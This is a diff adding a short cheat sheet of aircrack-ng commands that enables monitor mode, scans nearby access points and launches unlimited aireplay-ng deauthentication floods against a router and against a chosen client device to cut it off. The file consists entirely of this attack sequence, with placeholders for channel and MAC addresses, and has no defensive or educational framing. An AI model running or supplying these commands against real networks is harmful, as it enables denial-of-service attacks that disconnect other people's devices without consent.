@@ -1,0 +1,9 @@
+iwconfig
+airmon-ng
+airmon-ng start wlan0
+airodump-ng wlan0mon
+airodump-ng -c[CH no] --bssid{} wlan0mon
+aireplay-ng -0 0 -a {mac add of wifi r} wlan0mon
+for stop
+aireplay-ng -0 0 -a {mac add of wifi r} -c {mac add for stop} wlan0mon
+airmon-ng stop wlan0mon
